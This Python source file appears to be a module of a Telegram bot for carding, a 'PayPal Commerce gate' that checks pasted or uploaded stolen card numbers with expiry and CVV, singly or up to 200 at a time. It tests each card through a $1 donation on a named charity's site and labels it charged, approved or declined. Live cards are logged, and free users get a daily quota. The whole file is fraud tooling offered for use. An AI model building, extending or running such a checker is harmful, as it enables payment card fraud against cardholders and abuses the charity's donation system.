"""PayPal Commerce gate - /pp single, /mpp mass.

Powered by the legacy `bot_pp_legacy.check_cc` checker
(rarediseasesinternational.org $1 donation).
"""
import asyncio
import re
import time
from concurrent.futures import ThreadPoolExecutor

from aiogram import Router, F, Bot
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandObject
from aiogram.types import Message

import database.db as db
from config import OWNER_IDS, FREE_DAILY_LIMIT, OWNER_USERNAME
from functions.emojis import EMOJI
from functions.file_input import read_attached_txt
from commands import bot_pp_legacy as _pp_lib

router = Router()
_executor = ThreadPoolExecutor(max_workers=8)

_CARD_RE = re.compile(r"(\d{15,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})")


async def _is_owner_or_admin(uid: int) -> bool:
    if uid in OWNER_IDS:
        return True
    return await db.is_admin(uid)


async def _can_check(uid: int) -> tuple[bool, str]:
    if await _is_owner_or_admin(uid):
        return True, ""
    plan = await db.get_user_plan(uid)
    if plan["unlimited"]:
        return True, ""
    used = await db.get_daily_hits(uid)
    if used >= FREE_DAILY_LIMIT:
        return False, f"Daily free limit reached. Contact {OWNER_USERNAME}."
    return True, ""


def _normalise(card: str) -> str | None:
    m = _CARD_RE.search(card)
    if not m:
        return None
    n, mm, yy, cvv = m.groups()
    yy = yy[-2:] if len(yy) > 2 else yy.zfill(2)
    return f"{n}|{mm.zfill(2)}|{yy}|{cvv}"


def _format_result(card: str, status: str, msg: str, elapsed: float, gate: str = "PayPal Commerce $1") -> str:
    if status == "CHARGED":
        head = f"{EMOJI['charged']} <b>CHARGED</b>"
    elif status == "APPROVED":
        head = f"{EMOJI['live']} <b>APPROVED</b>"
    elif status == "DECLINED":
        head = f"{EMOJI['declined']} <b>DECLINED</b>"
    else:
        head = f"{EMOJI['error']} <b>{status}</b>"

    return (
        f"{head}\n"
        f"━━━━━━━━━━━━━━\n"
        f"<b>Card:</b> <code>{card}</code>\n"
        f"<b>Gate:</b> {gate}\n"
        f"<b>Reply:</b> <code>{msg}</code>\n"
        f"<b>Time:</b> {elapsed:.2f}s\n"
        f"━━━━━━━━━━━━━━\n"
        f"<i>by {OWNER_USERNAME}</i>"
    )


async def _check_card_async(card: str):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(_executor, _pp_lib.check_cc, card, None)


@router.message(Command("pp", prefix="/."))
async def cmd_pp(msg: Message, command: CommandObject):
    uid = msg.from_user.id
    if await db.is_banned(uid):
        await msg.answer(f"{EMOJI['ban']} You are banned.", parse_mode=ParseMode.HTML)
        return
    ok, why = await _can_check(uid)
    if not ok:
        await msg.answer(f"{EMOJI['lock']} {why}", parse_mode=ParseMode.HTML)
        return
    raw = (command.args or "").strip()
    card = _normalise(raw)
    if not card:
        await msg.answer(
            f"{EMOJI['question']} Usage: <code>/pp cc|mm|yy|cvv</code>",
            parse_mode=ParseMode.HTML,
        )
        return
    sent = await msg.answer(
        f"{EMOJI['hitting']} <b>Checking on PayPal $1…</b>\n<code>{card}</code>",
        parse_mode=ParseMode.HTML,
    )
    t0 = time.time()
    try:
        status, response = await _check_card_async(card)
    except Exception as e:
        await sent.edit_text(
            f"{EMOJI['error']} Gate error: <code>{str(e)[:80]}</code>",
            parse_mode=ParseMode.HTML,
        )
        return
    elapsed = time.time() - t0
    text = _format_result(card, status, response, elapsed)
    await sent.edit_text(text, parse_mode=ParseMode.HTML)

    if not await _is_owner_or_admin(uid):
        await db.increment_daily_hits(uid)
    if status in ("CHARGED", "APPROVED"):
        await db.log_check(uid, card, "", "PayPal $1", "$1", status, response, 0.0)


@router.message(Command("mpp", prefix="/."))
async def cmd_mpp(msg: Message, command: CommandObject, bot: Bot):
    uid = msg.from_user.id
    if await db.is_banned(uid):
        await msg.answer(f"{EMOJI['ban']} You are banned.", parse_mode=ParseMode.HTML)
        return
    ok, why = await _can_check(uid)
    if not ok:
        await msg.answer(f"{EMOJI['lock']} {why}", parse_mode=ParseMode.HTML)
        return

    cards: list[str] = []

    def _add(line: str):
        c = _normalise(line)
        if c and c not in cards:
            cards.append(c)

    if command.args:
        for line in command.args.splitlines():
            _add(line)
    if msg.reply_to_message and msg.reply_to_message.text:
        for line in msg.reply_to_message.text.splitlines():
            _add(line)

    txt_blob = await read_attached_txt(msg, bot)
    if txt_blob:
        for line in txt_blob.splitlines():
            _add(line)

    if not cards:
        await msg.answer(
            f"{EMOJI['question']} Usage:\n<code>/mpp\ncc|mm|yy|cvv\ncc|mm|yy|cvv</code>\n"
            f"…or reply to a message / attach a <code>.txt</code> file with cards.",
            parse_mode=ParseMode.HTML,
        )
        return

    cap = 200 if txt_blob else 25
    cards = cards[:cap]
    is_priv = await _is_owner_or_admin(uid)
    progress = await msg.answer(
        f"{EMOJI['hitting']} <b>Mass PayPal Check</b>\nQueued <code>{len(cards)}</code> cards…",
        parse_mode=ParseMode.HTML,
    )

    charged = approved = declined = errors = 0
    lines: list[str] = []
    for idx, card in enumerate(cards, 1):
        try:
            status, response = await _check_card_async(card)
        except Exception as e:
            status, response = "ERROR", str(e)[:40]

        if status == "CHARGED":
            charged += 1
            lines.append(f"{EMOJI['charged']} <code>{card}</code> · CHARGED")
            await db.log_check(uid, card, "", "PayPal $1", "$1", status, response, 0.0)
            await msg.answer(
                f"{EMOJI['charged']} <b>CHARGED</b>\n"
                f"<code>{card}</code>\n"
                f"Gate: PayPal $1\n"
                f"Reply: <code>{response[:80]}</code>",
                parse_mode=ParseMode.HTML,
            )
        elif status == "APPROVED":
            approved += 1
            lines.append(f"{EMOJI['live']} <code>{card}</code> · {response}")
            await db.log_check(uid, card, "", "PayPal $1", "$1", status, response, 0.0)
            await msg.answer(
                f"{EMOJI['live']} <b>APPROVED</b>\n"
                f"<code>{card}</code>\n"
                f"Gate: PayPal $1\n"
                f"Reply: <code>{response[:80]}</code>",
                parse_mode=ParseMode.HTML,
            )
        elif status == "DECLINED":
            declined += 1
            lines.append(f"{EMOJI['declined']} <code>{card}</code> · {response}")
        else:
            errors += 1
            lines.append(f"{EMOJI['error']} <code>{card}</code> · {response}")

        if not is_priv:
            await db.increment_daily_hits(uid)

        body = "\n".join(lines[-12:])
        try:
            await progress.edit_text(
                f"{EMOJI['hitting']} <b>PP {idx}/{len(cards)}</b>\n"
                f"{EMOJI['charged']} {charged} · {EMOJI['live']} {approved} · "
                f"{EMOJI['declined']} {declined} · {EMOJI['error']} {errors}\n"
                f"━━━━━━━━━━━━━━\n{body}",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass

    summary = (
        f"{EMOJI['stats']} <b>PayPal Mass Done</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"{EMOJI['charged']} Charged: <code>{charged}</code>\n"
        f"{EMOJI['live']} Approved: <code>{approved}</code>\n"
        f"{EMOJI['declined']} Declined: <code>{declined}</code>\n"
        f"{EMOJI['error']} Errors:  <code>{errors}</code>\n"
        f"━━━━━━━━━━━━━━\n"
        f"<i>by {OWNER_USERNAME}</i>"
    )
    try:
        await progress.edit_text(summary, parse_mode=ParseMode.HTML)
    except Exception:
        await msg.answer(summary, parse_mode=ParseMode.HTML)
